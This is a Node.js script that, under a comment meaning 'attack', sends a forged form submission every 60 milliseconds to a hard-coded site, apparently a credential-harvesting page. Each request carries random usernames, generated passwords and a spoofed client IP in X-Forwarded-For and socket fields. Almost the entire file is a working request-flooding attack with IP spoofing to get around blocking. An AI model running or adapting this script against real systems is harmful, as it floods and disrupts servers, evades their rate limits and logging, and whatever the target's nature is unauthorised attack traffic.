const express = require('express');
const axios = require('axios');
const randomNum = require('zhf.random-num');
const app = express();

// 进攻
setInterval(function () {
    // 地址
    const addressArr = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
    const addressLen = addressArr.length;
    const address = addressArr[Math.round(Math.random() * (addressLen - 1))];
    // ip
    const ip = `::ffff:${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}`;
    // 用户名
    const username = randomNum(111111, 9999999999);
    // 密码
    /*
    密码最小长度为6位；
    高强度密码须包含以下4种中的3种：
    1.大写字母
    2.小写字母
    3.数字
    4.特殊符号，如$、*、%...
    */
    var english = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
    var num = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    var englishLen = english.length;
    var password = `${english.slice(Math.round(Math.random() * englishLen - 13), 6).join('')}${Math.round(Math.random() * 999999)}`;
    var password2 = `${['A', 'd', 'g', 'z', 'X'].sort(() => Math.random() - 0.5).join('')}${randomNum(1111, 9999999)}`;
    var password3 = password2.split('').sort(() => Math.random() - 0.5);
    password3.unshift(english.sort(() => Math.random() - 0.5)[0]);
    var password4 = password3.join('');
    axios({
        url: 'http://www.dnf-me.cn/in.asp?action=add',
        method: 'post',
        headers: {
            'x-forwarded-for': ip,
        },
        connection: {
            remoteAddress: ip, // 这个能获取到
            socket: {
                remoteAddress: ip,
            },
        },
        socket: {
            remoteAddress: ip, // 这个能获取到
        },
        data: {
            dede_fields: 'u,text;p,text',
            dede_fieldshash: ['d1WEGXsPu8CFufla1kRw8W8kW3QA2TG'.split('').sort(() => Math.random() - 0.5).join(''), 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG'][Math.round(Math.random())],
            ipku: address,
            ip: ip,
            j_dh: username,
            j_xm: password4,
        },
    }).then(function (json) {
        console.log(password4);
        // console.log(json);
    });
}, 60);
// 监听进程
app.listen('6661');
